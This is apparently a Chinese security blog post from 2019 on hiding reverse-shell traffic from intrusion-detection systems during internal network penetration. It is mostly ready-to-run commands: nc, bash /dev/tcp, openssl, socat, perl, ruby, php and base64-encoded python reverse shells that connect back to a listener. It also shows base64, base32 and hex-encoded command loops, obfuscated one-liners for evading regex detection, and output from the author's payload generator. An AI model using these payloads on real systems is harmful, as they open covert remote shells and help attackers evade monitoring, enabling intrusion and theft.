---
layout: post
title:  "对基础 shell 进行流量混淆"
date:   2019-11-06 19:10:01 +0800
categories: Lateral-movement 
tag: Bypass AV 
---

* content
{:toc}




0x00 前言
------------------

最近在渗透公司内网，通过exp实现执行命令，这时都会想拿到一个反弹shell再说。但问题是，面对公司内部各种IDS、IPS，甚至还有HIDS等等，轻举妄动很容易直接打出GG，而且这个时候跑大马是不太现实的，内网环境比较弱。 于是如何在流量层面上，不触发报警然后弹回一个反弹shell，就是本文产生的原因。

下文将介绍一些常见的反弹流量编码/加密的方法，并介绍一下自己写的脚本。



## 0x01 常见的反弹shell

在真正开始吃正餐之前，让我们来点开胃菜，帮大家回忆一下正常的反弹 shell 一般是怎么操作的：

### Server 端

监听**8080**端口：

```
nc -lvp 23333
```

### Client 端

反弹shell的方式比较多，网上介绍资料也琳琅满目，这里随便挑一两个例子看看就好：

```
nc -e /bin/bash x.x.x.x 23333
bash -i >& /dev/tcp/x.x.x.x/23333 0>&1
0<&137-;exec 137<>/dev/tcp/x.x.x.x/23333;sh <&137 >&137 2>&137
mknod backpipe p && telnet x.x.x.x 8080 0< backpipe | /bin/bash 1> backpipe
```

还有其他起码十几种方法，如perl，python，php等等。



0x02 SSL加密的反弹shell
------------------

OpenSSL 在常见的Linux系统中普遍存在，我们可以直接用来启动服务端，不依赖其他的脚本。

### Server 端

使用 openssl 命令，先生成证书，然后使用命令监听端口。

```
# Generate cert

openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# openssl

openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```



使用ncat 命令（ncat 和nc不同，ncat是nmap出的一个nc的增强版，一般需要单独安装。）

```
ncat -lvnp 4444 --ssl --ssl-cert=cert.pem --ssl-key=key.pem
```



使用socat命令，需要先生成证书，然后监听

```
# socat generate cert

openssl req -new -x509 -keyout test.key -out test.crt -nodes
cat test.key test.crt > test.pem

# socat 

socat openssl-listen:4444,reuseaddr,cert=test.pem,verify=0,fork stdio
```



也可以使用 dark-shell[^1]来完成该功能，该脚本的好处是不用生成证书。

```
ruby dark_shell.rb listen 127.0.0.1 4444 ssl
```

如图：

![/styles/images/snort/p1.png]({{ '/styles/images/shell/p1.png' | prepend: site.baseurl }})



另外，服务端也可以使用metasploit启动，如下

```
msf5 exploit(multi/handler) > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload cmd/unix/reverse_perl_ssl
payload => cmd/unix/reverse_perl_ssl
msf5 exploit(multi/handler) > set verbose true
verbose => true
msf5 exploit(multi/handler) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf5 exploit(multi/handler) > set lport 2332
lport => 2332
msf5 exploit(multi/handler) > set exitonsession false
msf5 exploit(multi/handler) > exploit -j
```

reverse_perl_ssl，reverse_python_ssl, reverse_ruby_ssl 等 监听的 payload 其实完全一样，这里是可以混用的。



### Client 端

还是可以使用 **openssl** 命令：

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.16.1.174:1337 > /tmp/s; rm /tmp/s
```



**ncat** 也可以，但较少遇到

```
ncat --ssl 127.0.0.1 4444 -e /bin/bash
```



**socat**，第一行是比较常见和简单的形式，第二行是交互型的shell

```
socat exec:'bash' openssl-connect:127.0.0.1:4444,verify=0
socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:127.0.0.1:4444,verify=0
```



**Perl**

```
perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>"127.0.0.1:2332",SSL_verify_mode=>0);while(sysread($c,$i,8192)){syswrite($c,`$i`);}'
```

**Ruby** 

```
ruby -rsocket -ropenssl -e 'c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("127.0.0.1","1234")).connect;while(cmd=c.gets);puts(cmd);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end'
```

**PHP**

```
php -r '$ctxt=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);while($s=@stream_socket_client("ssl://127.0.0.1:4444",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode("\n",$o);$o.="\n";fputs($s,$o);}}'&
```

**Python**（需要自己解码修改然后重新编码）

```
python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHNzbApzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzEyNy4wLjAuMScsNDQ0NCkpCnM9c3NsLndyYXBfc29ja2V0KHNvKQp5bj1GYWxzZQp3aGlsZSBub3QgeW46CglkYXRhPXMucmVjdigxMDI0KQoJaWYgbGVuKGRhdGEpPT0wOgoJCXluID0gVHJ1ZQoJcHJvYz1zdWJwcm9jZXNzLlBvcGVuKGRhdGEsc2hlbGw9VHJ1ZSxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsc3RkaW49c3VicHJvY2Vzcy5QSVBFKQoJc3Rkb3V0X3ZhbHVlPXByb2Muc3Rkb3V0LnJlYWQoKSArIHByb2Muc3RkZXJyLnJlYWQoKQoJcy5zZW5kKHN0ZG91dF92YWx1ZSkK'.decode('base64'))" >/dev/null 2>&1
```



使用 **dark-shell** 生成命令，会自动化输出客户端连接命令，包含各种各样的 payload

```
$ ruby dark_shell.rb gen 127.0.0.1 4444 ssl


____             _         ____  _          _ _
|  _ \  __ _ _ __| | __    / ___|| |__   ___| | |
| | | |/ _` | '__| |/ /    \___ \| '_ \ / _ \ | |
| |_| | (_| | |  |   <      ___) | | | |  __/ | |
|____/ \__,_|_|  |_|\_\    |____/|_| |_|\___|_|_|


See more: https://github.com/Green-m/dark-shell

SSL payload to connect 127.0.0.1:4444


    mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:4444 > /tmp/s; rm /tmp/s

    ncat --ssl 127.0.0.1 4444 -e /bin/bash

    socat exec:'bash' openssl-connect:127.0.0.1:4444,verify=0

    perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>"127.0.0.1:4444",SSL_verify_mode=>0);while(sysread($c,$i,8192)){syswrite($c,`$i`);}'

    ruby -rsocket -ropenssl -e 'c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("127.0.0.1","4444")).connect;while(cmd=c.gets);puts(cmd);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end'

    php -r '$ctxt=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);while($s=@stream_socket_client("ssl://127.0.0.1:4444",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode("\n",$o);$o.="\n";fputs($s,$o);}}'&

    python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHNzbApzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzEyNy4wLjAuMScsNDQ0NCkpCnM9c3NsLndyYXBfc29ja2V0KHNvKQp5bj1GYWxzZQp3aGlsZSBub3QgeW46CiAgICBkYXRhPXMucmVjdigxMDI0KQogICAgaWYgbGVuKGRhdGEpPT0wOgogICAgICAgIHluID0gVHJ1ZQogICAgcHJvYz1zdWJwcm9jZXNzLlBvcGVuKGRhdGEsc2hlbGw9VHJ1ZSxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsc3RkaW49c3VicHJvY2Vzcy5QSVBFKQogICAgc3Rkb3V0X3ZhbHVlPXByb2Muc3Rkb3V0LnJlYWQoKSArIHByb2Muc3RkZXJyLnJlYWQoKQogICAgcy5zZW5kKHN0ZG91dF92YWx1ZSkK'.decode('base64'))" >/dev/null 2>&1
```



**注意**：

服务端的命令和客户端的命令不一定需要相同，是可以混用的。比如用 ncat 的服务端，可以使用perl/python/socat 等方式链接，甚至 metasploit 的 reverse_perl_ssl 作为服务端监听的端口，也可以使用 ncat -ssl 进行连接，底层的原理都是一样的。



0x03 Base64/Base32/Hex 编码的反弹shell
------------------

为什么会选择这三种方式来编码流量呢，因为大部分的系统里面都自带这几个命令，这也符合本文的出发点。

Base64 / Base32 / Hex 三者的命令和原理都很类似，因此就放一起来讲。

由于nc / bash / telnet 等命令基本都不支持对流量进行编码，因此需要我们对流量进行单独处理。



### Server 端

服务端使用原生自带的命令来监听比较麻烦，命令比较长，也容易出问题。因此我这里就直接采用 dark-shell 的方式来进行。

使用 dark-shell

```
ruby dark_shell.rb listen 0.0.0.0 4444 base64
ruby dark_shell.rb listen 0.0.0.0 4444 base32
ruby dark_shell.rb listen 0.0.0.0 4444 hex
```



### Client 端

通过三个命令来实现（如果有更好的欢迎在评论中补充）:

**exec** 

```
# base64
0<&137-;exec 137<>/dev/tcp/127.0.0.1/4444;cat <&137 |while read ff; do echo $ff|base64 -d|sh |base64 >&137 2>&137;done

# base32
0<&137-;exec 137<>/dev/tcp/127.0.0.1/4444;cat <&137 |while read ff; do echo $ff|base32 -d|sh |base32 >&137 2>&137;done

# hex
0<&137-;exec 137<>/dev/tcp/127.0.0.1/4444;cat <&137 |while read ff; do echo $ff|xxd -r -p|sh |xxd -p >&137 2>&137;done
```

**nc**

```
# base64
mknod backpipe p;tail -f backpipe |nc 127.0.0.1 4444 | while read ff; do echo $ff|base64 -d|bash|base64 &> backpipe; done

# base32
mknod backpipe p;tail -f backpipe |nc 127.0.0.1 4444 | while read ff; do echo $ff|base32 -d|bash|base32 &> backpipe; done

# hex
mknod backpipe p;tail -f backpipe |nc 127.0.0.1 4444 | while read ff; do echo $ff|xxd -r -p|bash|xxd -p &> backpipe; done

```

**telnet**

```
# base64
tail -f backpipe |telnet 127.0.0.1 4444 | while read ff; do echo $ff|base64 -d|bash|base64 &> backpipe; done

# base32
tail -f backpipe |telnet 127.0.0.1 4444 | while read ff; do echo $ff|base32 -d|bash|base32 &> backpipe; done

# hex
tail -f backpipe |telnet 127.0.0.1 4444 | while read ff; do echo $ff|xxd -r -p|bash|xxd -p &> backpipe; done
```



dark-shell 直接生成，最后的参数为编码的方式。

```
$ ruby dark_shell.rb gen 127.0.0.1 4444 hex


____             _         ____  _          _ _
|  _ \  __ _ _ __| | __    / ___|| |__   ___| | |
| | | |/ _` | '__| |/ /    \___ \| '_ \ / _ \ | |
| |_| | (_| | |  |   <      ___) | | | |  __/ | |
|____/ \__,_|_|  |_|\_\    |____/|_| |_|\___|_|_|


See more: https://github.com/Green-m/dark-shell

HEX payload to connect 127.0.0.1:4444


    0<&137-;exec 137<>/dev/tcp/127.0.0.1/4444;cat <&137 |while read ff; do echo $ff|xxd -r -p|sh |xxd -p >&137 2>&137;done

    mknod backpipe p;tail -f backpipe |nc 127.0.0.1 4444 | while read ff; do echo $ff|xxd -r -p|sh|xxd -p &> backpipe;done;rm backpipe

    mknod backpipe p;tail -f backpipe |telnet 127.0.0.1 4444 | while read ff; do echo $ff|xxd -r -p|sh|xxd -r -p &> backpipe;done;rm backpipe
```



0x04 编码命令
------------------

由于 hids，nids，waf 等各种安全检测手段的存在，我们的命令可能直接会匹配上某些正则规则（大部分ids还依赖这样比较低级的手法来检测），从而触发报警；另外， 前文中的 **hex** 和 **base64** 编码的命令，是多条命令拼接和处理的，存在大量符号和空格，容易被截断和转义。 

出于这两种情况的存在，我们可以对命令进行编码，来解决这样的问题。

如本来命令为

```
whoami
```

可以编码为

```
/bin/bash -c '{echo,d2hvYW1pCg==}|{base64,-d}|{bash,-i}'
```

或

```
echo 77686f616d690a|xxd -p -r| bash -i
```

这样就有不容易将我们真正的 payload 截断或者转义了，~~某些情况下，如果运气比较好也能绕过一些IDS~~。



在 **dark-shell** 里我直接实现了这样的功能：

```
$ ruby dark_shell.rb gencode 172.0.0.1 4444 base64


____             _         ____  _          _ _
|  _ \  __ _ _ __| | __    / ___|| |__   ___| | |
| | | |/ _` | '__| |/ /    \___ \| '_ \ / _ \ | |
| |_| | (_| | |  |   <      ___) | | | |  __/ | |
|____/ \__,_|_|  |_|\_\    |____/|_| |_|\___|_|_|


See more: https://github.com/Green-m/dark-shell

BASE64 payload to connect 172.0.0.1:4444


---------------------------------------------------------------

    0<&137-;exec 137<>/dev/tcp/172.0.0.1/4444;cat <&137 |while read ff; do echo $ff|base64 -d|sh |base64 >&137 2>&137;done
    sh -c '{echo,MDwmMTM3LTtleGVjIDEzNzw+L2Rldi90Y3AvMTcyLjAuMC4xLzQ0NDQ7Y2F0IDwmMTM3IHx3aGlsZSByZWFkIGZmOyBkbyBlY2hvICRmZnxiYXNlNjQgLWR8c2ggfGJhc2U2NCA+JjEzNyAyPiYxMzc7ZG9uZQ==}|{base64,-d}|{bash,-i}'
    sh -c '{echo,303c263133372d3b65786563203133373c3e2f6465762f7463702f3137322e302e302e312f343434343b636174203c26313337207c7768696c6520726561642066663b20646f206563686f202466667c626173653634202d647c7368207c626173653634203e2631333720323e263133373b646f6e65}|{xxd,-p,-r}|{bash,-i}'
    sh -c '{echo,GA6CMMJTG4WTWZLYMVRSAMJTG46D4L3EMV3C65DDOAXTCNZSFYYC4MBOGEXTINBUGQ5WGYLUEA6CMMJTG4QHY53INFWGKIDSMVQWIIDGMY5SAZDPEBSWG2DPEASGMZT4MJQXGZJWGQQC2ZD4ONUCA7DCMFZWKNRUEA7CMMJTG4QDEPRGGEZTOO3EN5XGK===}|{base32,-d}|{bash,-i}'

---------------------------------------------------------------

    mknod backpipe p;tail -f backpipe |nc 172.0.0.1 4444 | while read ff; do echo $ff|base64 -d|sh|base64 &> backpipe;done;rm backpipe
    sh -c '{echo,bWtub2QgYmFja3BpcGUgcDt0YWlsIC1mIGJhY2twaXBlIHxuYyAxNzIuMC4wLjEgNDQ0NCB8IHdoaWxlIHJlYWQgZmY7IGRvIGVjaG8gJGZmfGJhc2U2NCAtZHxzaHxiYXNlNjQgJj4gYmFja3BpcGU7ZG9uZTtybSBiYWNrcGlwZQ==}|{base64,-d}|{bash,-i}'
    sh -c '{echo,6d6b6e6f64206261636b7069706520703b7461696c202d66206261636b70697065207c6e63203137322e302e302e312034343434207c207768696c6520726561642066663b20646f206563686f202466667c626173653634202d647c73687c62617365363420263e206261636b706970653b646f6e653b726d206261636b70697065}|{xxd,-p,-r}|{bash,-i}'
    sh -c '{echo,NVVW433EEBRGCY3LOBUXAZJAOA5XIYLJNQQC2ZRAMJQWG23QNFYGKID4NZRSAMJXGIXDALRQFYYSANBUGQ2CA7BAO5UGS3DFEBZGKYLEEBTGMOZAMRXSAZLDNBXSAJDGMZ6GEYLTMU3DIIBNMR6HG2D4MJQXGZJWGQQCMPRAMJQWG23QNFYGKO3EN5XGKO3SNUQGEYLDNNYGS4DF}|{base32,-d}|{bash,-i}'

---------------------------------------------------------------

    mknod backpipe p;tail -f backpipe |telnet 172.0.0.1 4444 | while read ff; do echo $ff|base64 -d|sh|base64 -d &> backpipe;done;rm backpipe
    sh -c '{echo,bWtub2QgYmFja3BpcGUgcDt0YWlsIC1mIGJhY2twaXBlIHx0ZWxuZXQgMTcyLjAuMC4xIDQ0NDQgfCB3aGlsZSByZWFkIGZmOyBkbyBlY2hvICRmZnxiYXNlNjQgLWR8c2h8YmFzZTY0IC1kICY+IGJhY2twaXBlO2RvbmU7cm0gYmFja3BpcGU=}|{base64,-d}|{bash,-i}'
    sh -c '{echo,6d6b6e6f64206261636b7069706520703b7461696c202d66206261636b70697065207c74656c6e6574203137322e302e302e312034343434207c207768696c6520726561642066663b20646f206563686f202466667c626173653634202d647c73687c626173653634202d6420263e206261636b706970653b646f6e653b726d206261636b70697065}|{xxd,-p,-r}|{bash,-i}'
    sh -c '{echo,NVVW433EEBRGCY3LOBUXAZJAOA5XIYLJNQQC2ZRAMJQWG23QNFYGKID4ORSWY3TFOQQDCNZSFYYC4MBOGEQDINBUGQQHYIDXNBUWYZJAOJSWCZBAMZTDWIDEN4QGKY3IN4QCIZTGPRRGC43FGY2CALLEPRZWQ7DCMFZWKNRUEAWWIIBGHYQGEYLDNNYGS4DFHNSG63TFHNZG2IDCMFRWW4DJOBSQ====}|{base32,-d}|{bash,-i}'
```



通过`- - - `符号来分隔，每段的第一条表示编码前的命令，后面三条命令是不同的编码形式： base64, hex, base32。

这样生成还算比较方便， 你也可以根据自己的需求进行其他变换。





0x05 使用非原生命令或程序
------------------

本文的重点是尽量考虑使用原生命令来实现流量编码，一般是受限制的环境或者是最开始的渗透阶段，没有足够的条件去上传或者下载大马。

不过这里也简单提一下非原生的程序或者木马来实现该功能。

### Meterpreter

MSF 中的 meterpreter 最常用的 reverse_tcp 就是进行过编码的，根据自己的流量进行协商，追求更好的效果可以考虑使用 reverse_tcp_rc4 或 reverse_https



### SBD

使用类似nc，加密传输的工具

```
# server
sbd 127.0.0.1 4444 -e /bin/bash

# client
sbd -lvp 4444
```



### 其他各种开源/商业的远控和木马

PoisonIvy 、cobaltstrike、灰鸽子等，不具体展开了，非常多。



0x06 总结
------------------

自从换了工作之后又很久没写博客了，正好最近研究了一些新的东西，分享出来，希望对大家有所帮助。

最后祝大家身体健康！



0x07 附录
------------------

[^1]:dark-shell 是笔者写的一个脚本，用来自动化本文的一些操作，见 <https://github.com/Green-m/dark-shell>

